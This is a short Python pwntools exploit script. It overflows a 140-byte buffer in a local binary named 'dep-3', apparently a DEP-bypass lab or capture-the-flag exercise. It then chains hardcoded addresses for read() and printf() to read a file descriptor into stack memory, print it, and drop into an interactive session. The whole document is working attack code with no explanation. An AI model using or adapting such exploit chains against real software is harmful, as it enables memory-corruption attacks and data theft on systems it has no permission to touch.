#!/usr/bin/env python
from pwn import *

size = 140

read_addr = p32(0x806c830)
sf_addr = p32(0x80488cd)
printf_addr = p32(0x804f9a0)

kek_addr = p32(0xffffd100)

buf = 'A' * size + sf_addr
buf += read_addr
buf += printf_addr
buf += p32(3) + kek_addr + p32(0x100)
buf += kek_addr

print 'Payload: %s' % buf

p = process('./dep-3')

p.send(buf)
p.interactive()
